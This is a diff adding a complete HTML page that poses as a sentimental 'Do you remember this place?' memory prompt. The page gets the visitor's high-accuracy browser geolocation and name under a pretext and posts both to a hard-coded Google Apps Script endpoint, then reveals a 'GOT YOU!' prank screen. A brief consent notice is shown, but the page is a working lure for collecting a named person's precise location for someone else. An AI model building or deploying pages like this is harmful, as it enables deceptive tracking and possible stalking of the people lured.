@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Our Memory</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    min-height: 100vh;
+    background: #090909;
+    color: white;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+}
+
+.container {
+    width: 100%;
+    max-width: 500px;
+    min-height: 100vh;
+    padding: 25px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+}
+
+.screen {
+    display: none;
+    width: 100%;
+    animation: fadeIn 0.8s ease;
+}
+
+.screen.active {
+    display: block;
+}
+
+.memory-image {
+    width: 100%;
+    max-height: 55vh;
+    object-fit: cover;
+    border-radius: 20px;
+    box-shadow: 0 15px 40px rgba(0,0,0,0.6);
+    margin-bottom: 25px;
+    animation: imageIn 1s ease;
+}
+
+h1 {
+    font-size: 28px;
+    margin-bottom: 12px;
+}
+
+p {
+    color: #cccccc;
+    line-height: 1.6;
+    margin-bottom: 25px;
+}
+
+button {
+    width: 100%;
+    max-width: 320px;
+    padding: 16px 20px;
+    border: none;
+    border-radius: 50px;
+    background: white;
+    color: black;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    margin: 8px;
+}
+
+button:active {
+    transform: scale(0.96);
+}
+
+.secondary {
+    background: #222;
+    color: white;
+}
+
+input {
+    width: 100%;
+    max-width: 320px;
+    padding: 16px;
+    border-radius: 15px;
+    border: 1px solid #444;
+    background: #181818;
+    color: white;
+    font-size: 16px;
+    outline: none;
+    margin-bottom: 15px;
+}
+
+.loading {
+    font-size: 18px;
+    animation: pulse 1.2s infinite;
+}
+
+.success {
+    font-size: 50px;
+    margin-bottom: 20px;
+}
+
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(25px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+@keyframes imageIn {
+    from {
+        opacity: 0;
+        transform: scale(0.85);
+    }
+    to {
+        opacity: 1;
+        transform: scale(1);
+    }
+}
+
+@keyframes pulse {
+    0%, 100% {
+        opacity: 0.4;
+    }
+    50% {
+        opacity: 1;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- MEMORY SCREEN -->
+    <div class="screen active" id="memoryScreen">
+
+        <!-- Replace this image URL with your own photo -->
+        <img
+            class="memory-image"
+            src="https://i.ibb.co/Jj7hcJPp/Screenshot-2026-0727-214303.png"
+            alt="Memory">
+
+        <h1>Do you remember this place? ❤️</h1>
+
+        <p>
+            Some memories are worth remembering...
+        </p>
+
+        <button onclick="showLocationInfo()">
+            Yes, I remember!
+        </button>
+
+    </div>
+
+
+    <!-- LOCATION INFORMATION -->
+    <div class="screen" id="locationInfoScreen">
+
+        <h1>📍 One little thing</h1>
+
+        <p>
+            To continue, this page will ask for your current location.
+            Your location will only be collected if you choose to share it.
+        </p>
+
+        <button onclick="requestLocation()">
+            Share my location
+        </button>
+
+        <button class="secondary" onclick="goBack()">
+            Go back
+        </button>
+
+    </div>
+
+
+    <!-- NAME SCREEN -->
+    <div class="screen" id="nameScreen">
+
+        <h1>Almost done 😊</h1>
+
+        <p>
+            What is your name?
+        </p>
+
+        <input
+            type="text"
+            id="nameInput"
+            placeholder="Enter your name"
+            maxlength="50">
+
+        <button onclick="saveData()">
+            Continue
+        </button>
+
+    </div>
+
+
+    <!-- SAVING SCREEN -->
+    <div class="screen" id="savingScreen">
+
+        <div class="loading">
+            📡 Saving your memory...
+        </div>
+
+    </div>
+
+
+    <!-- SUCCESS SCREEN -->
+    <div class="screen" id="successScreen">
+
+        <div class="success">❤️</div>
+
+        <h1>Memory saved!</h1>
+
+        <p>
+            Thank you for remembering this place.
+        </p>
+
+        <button onclick="showPrank()">
+            Continue
+        </button>
+
+    </div>
+
+
+    <!-- PRANK SCREEN -->
+    <div class="screen" id="prankScreen">
+
+        <h1>😂 GOT YOU!</h1>
+
+        <p>
+            You just helped me remember where you are!
+            <br><br>
+            Don't worry — you gave permission before sharing your location. ❤️
+        </p>
+
+    </div>
+
+</div>
+
+
+<script>
+
+/*
+    IMPORTANT:
+    Replace this with your Google Apps Script Web App URL.
+*/
+
+const GOOGLE_SCRIPT_URL =
+    "https://script.google.com/macros/s/AKfycbzGC1mDAhfB2Mep5R4Mfgrw5Knl0ZLZ6JMud6LEQRj3a9uNJHSPMlC7lWZI4rp5cBS6/exec";
+
+
+let userLocation = null;
+
+
+// Change screens
+function showScreen(id) {
+
+    document.querySelectorAll(".screen").forEach(screen => {
+        screen.classList.remove("active");
+    });
+
+    document.getElementById(id).classList.add("active");
+}
+
+
+// Step 1
+function showLocationInfo() {
+
+    showScreen("locationInfoScreen");
+
+}
+
+
+// Back button
+function goBack() {
+
+    showScreen("memoryScreen");
+
+}
+
+
+// Step 2
+function requestLocation() {
+
+    if (!navigator.geolocation) {
+
+        alert("Location is not supported by this browser.");
+
+        return;
+    }
+
+
+    navigator.geolocation.getCurrentPosition(
+
+        function(position) {
+
+            userLocation = {
+
+                latitude: position.coords.latitude,
+
+                longitude: position.coords.longitude,
+
+                accuracy: position.coords.accuracy
+
+            };
+
+
+            // Location successfully obtained
+            showScreen("nameScreen");
+
+        },
+
+
+        function(error) {
+
+            if (error.code === 1) {
+
+                alert(
+                    "Location permission was not granted. " +
+                    "You can continue only if you choose to share your location."
+                );
+
+            } else {
+
+                alert(
+                    "Unable to get your location. Please try again."
+                );
+
+            }
+
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+
+    );
+
+}
+
+
+// Step 3
+async function saveData() {
+
+    const name =
+        document.getElementById("nameInput").value.trim();
+
+
+    if (name === "") {
+
+        alert("Please enter your name.");
+
+        return;
+    }
+
+
+    if (!userLocation) {
+
+        alert("Location was not obtained.");
+
+        return;
+    }
+
+
+    showScreen("savingScreen");
+
+
+    const data = {
+
+        name: name,
+
+        latitude: userLocation.latitude,
+
+        longitude: userLocation.longitude,
+
+        accuracy: userLocation.accuracy
+
+    };
+
+
+    try {
+
+        await fetch(GOOGLE_SCRIPT_URL, {
+
+            method: "POST",
+
+            mode: "no-cors",
+
+            headers: {
+
+                "Content-Type": "text/plain;charset=utf-8"
+
+            },
+
+            body: JSON.stringify(data)
+
+        });
+
+
+        showScreen("successScreen");
+
+
+    } catch (error) {
+
+        console.error(error);
+
+        alert(
+            "Something went wrong while saving the information."
+        );
+
+        showScreen("nameScreen");
+
+    }
+
+}
+
+
+// Final prank/reveal
+function showPrank() {
+
+    showScreen("prankScreen");
+
+}
+
+</script>
+
+</body>
+</html>
